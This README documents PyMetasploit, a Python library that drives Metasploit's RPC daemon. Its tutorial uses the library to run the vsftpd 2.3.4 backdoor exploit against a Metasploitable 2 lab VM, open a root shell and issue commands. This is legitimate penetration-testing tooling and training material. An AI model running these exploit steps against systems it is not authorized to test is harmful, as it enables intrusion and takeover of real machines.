PyMetasploit for Python 3
=======

PyMetasploit is a full-fledged `msfrpc` library for Python. It is meant to interact with the msfrpcd daemon that comes
with the latest versions of Metasploit. It does NOT interact with the console-based scripts that Metasploit provides
such as msfconsole, msfvenom, etc. Therefore, before you can begin to use this library, you'll need to initialize
`msfrpcd` and optionally (highly recommended) PostgreSQL.

# Update for Python 3

This is a forked and updated version of PyMetasploit for Python 3.
See `example.py` and the tutorial below for more information.

Original project  : https://github.com/allfro/pymetasploit

# Requirements

Before we begin, you'll need to install the following components:

* **Metasploit:** https://github.com/rapid7/metasploit-framework
* **PostgreSQL (Optional):** http://www.postgresql.org

Installing PostgreSQL is highly recommended as it will improve response times when querying `msfrpcd` (Metasploit RPC
daemon) for module information.

# Tutorial

## Starting `msfrpcd`

`msfrpcd` accepts the following arguments:

```bash
$ ./msfrpcd -h

   Usage: msfrpcd <options>

   OPTIONS:

       -P <opt>  Specify the password to access msfrpcd
       -S        Disable SSL on the RPC socket
       -U <opt>  Specify the username to access msfrpcd
       -a <opt>  Bind to this IP address
       -f        Run the daemon in the foreground
       -h        Help banner
       -n        Disable database
       -p <opt>  Bind to this port instead of 55553
       -u <opt>  URI for Web server
```

The only parameter that is required to launch `msfrpcd` is the `-P` (password) parameter. This specifies the password
that will be used to authenticate users to the daemon. As of this writing, `msfrpcd` only supports one username/password
combination. However, the same user can log into the daemon multiple times. Unless specified otherwise, the `msfrpcd`
daemon listens on port 55553 on all interfaces (`0.0.0.0:55553`).

For the purposes of this tutorial let's start the `msfrpcd` daemon with a minimal configuration:

```bash
$ ./msfrpcd -P mypassword -n -f -a 127.0.0.1
[*] MSGRPC starting on 0.0.0.0:55553 (SSL):Msg...
[*] MSGRPC ready at 2014-04-19 23:49:39 -0400.
```

The `-f` parameter tells `msfrpcd` to remain in the foreground and the `-n` parameter disables database support.
Finally, the `-a` parameter tells `msfrcpd` to listen for requests only on the local loopback interface (`127.0.0.1`).

## `MsfRpcClient` - Brief Overview

### Connecting to `msfrpcd`

Let's get started interacting with the Metasploit framework from python:

```python
>>> from metasploit.msfrpc import MsfRpcClient
>>> client = MsfRpcClient('mypassword')
```

The `MsfRpcClient` class provides the core functionality to navigate through the Metasploit framework. Let's take a
look at its underbelly:

```python
>>> [m for m in dir(client) if not m.startswith('_')]
['auth', 'authenticated', 'call', 'client', 'consoles', 'core', 'db', 'jobs', 'login', 'logout', 'modules', 'plugins',
'port', 'server', 'sessionid', 'sessions', 'ssl', 'uri']
>>>
```

Like the metasploit framework, `MsfRpcClient` is segmented into different management modules:

* **`auth`**: manages the authentication of clients for the `msfrpcd` daemon.
* **`consoles`**: manages interaction with consoles/shells created by Metasploit modules.
* **`core`**: manages the Metasploit framework core.
* **`db`**: manages the backend database connectivity for `msfrpcd`.
* **`modules`**: manages the interaction and configuration of Metasploit modules (i.e. exploits, auxiliaries, etc.)
* **`plugins`**: manages the plugins associated with the Metasploit core.
* **`sessions`**: manages the interaction with Metasploit meterpreter sessions.

### Running an Exploit

Just like the Metasploit console, you can retrieve a list of all the modules that are available. Let's take a look at
what exploits are currently loaded:

```python
>>> client.modules.exploits
['windows/wins/ms04_045_wins', 'windows/winrm/winrm_script_exec', 'windows/vpn/safenet_ike_11',
'windows/vnc/winvnc_http_get', 'windows/vnc/ultravnc_viewer_bof', 'windows/vnc/ultravnc_client', ...
'aix/rpc_ttdbserverd_realpath', 'aix/rpc_cmsd_opcode21']
>>>
```

We can also retrieve a list of `auxiliary`, `encoders`, `nops`, `payloads`, and `post` modules using the same syntax:

```python
>>> client.modules.auxiliary
...
>>> client.modules.encoders
...
>>> client.modules.nops
...
>>> client.modules.payloads
...
>>> client.modules.post
...
```

Now let's interact with one of the `exploit` modules:

```python
>>> exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
>>>
```

If all is well at this point, you will be able to query the module for various pieces of information such as author,
description, required run-time options, etc. Let's take a look:

```python
>>>  print exploit.description

          This module exploits a malicious backdoor that was added to the	VSFTPD download
          archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between
          June 30th 2011 and July 1st 2011 according to the most recent information
          available. This backdoor was removed on July 3rd 2011.

>>> exploit.authors
['hdm <hdm@metasploit.com>', 'MC <mc@metasploit.com>']
>>> exploit.options
['TCP::send_delay', 'ConnectTimeout', 'SSLVersion', 'VERBOSE', 'SSLCipher', 'CPORT', 'SSLVerifyMode', 'SSL', 'WfsDelay',
'CHOST', 'ContextInformationFile', 'WORKSPACE', 'EnableContextEncoding', 'TCP::max_send_size', 'Proxies',
'DisablePayloadHandler', 'RPORT', 'RHOST']
>>> exploit.required # Required options
['ConnectTimeout', 'RPORT', 'RHOST']
```

That's all fine and dandy but you're probably really itching to pop a box with this library right now, amiright!? Let's
do it! Let's use a [Metasploitable 2](http://sourceforge.net/projects/metasploitable/) instance running on a VMWare
machine as our target. Luckily it's running our favorite version of vsFTPd - 2.3.4 - and we already have our exploit
module loaded in PyMetasploit. Our next step is to specify our target:

```python
>>> exploit['RHOST'] = '172.16.14.145' # IP of our target host
>>>
```

You can also specify or retrieve other options as well, as long as they're listed in `exploit.options`, using the same
method as shown above. For example, let's get and set the `VERBOSE` option:

```python
>>> exploit['VERBOSE']
False
>>> exploit['VERBOSE'] = True
>>> exploit['VERBOSE']
True
>>>
```

Awesome! So now we're ready to execute our exploit. All we need to do is select a payload:

```python
>>> exploit.payloads
['cmd/unix/interact']
>>>
```

At this point, this exploit only supports one payload (`cmd/unix/interact`). So let's pop a shell:

```python
>>> exploit.execute(payload='cmd/unix/interact')
{'job_id': 1, 'uuid': '3whbuevf'}
>>>
```

Excellent! It looks like our exploit ran successfully. How can we tell? The `job_id` key contains a number. If the
module failed to execute for any reason, `job_id` would be `None`. For long running modules, you may want to poll the
job list by checking `client.jobs.list`. Since this is a fairly quick exploit, the job list will most likely be empty
and if we managed to pop our box, we might see something nice in the sessions list:

```python
>>> client.sessions.list
{1: {'info': '', 'username': 'ndouba', 'session_port': 21, 'via_payload': 'payload/cmd/unix/interact',
'uuid': '5orqnnyv', 'tunnel_local': '172.16.14.1:58429', 'via_exploit': 'exploit/unix/ftp/vsftpd_234_backdoor',
'exploit_uuid': '3whbuevf', 'tunnel_peer': '172.16.14.145:6200', 'workspace': 'false', 'routes': '',
'target_host': '172.16.14.145', 'type': 'shell', 'session_host': '172.16.14.145', 'desc': 'Command shell'}}
>>>
```

Success! We managed to pop the box! `client.sessions.list` shows us that we have a live session with the same `uuid` as
the one we received when executing the module earlier (`exploit.execute()`). Let's interact with the shell:

```python
>>> shell = client.sessions.session(1)
>>> shell.write('whoami\n')
>>> print shell.read()
root
>>> # Happy dance!
```

This is just a sample of how powerful PyMetasploit can be. Use your powers wisely, Grasshopper, because with great power
comes great responsibility – unless you are a banker.

# Questions?

Email me at ndouba.at.gmail.com
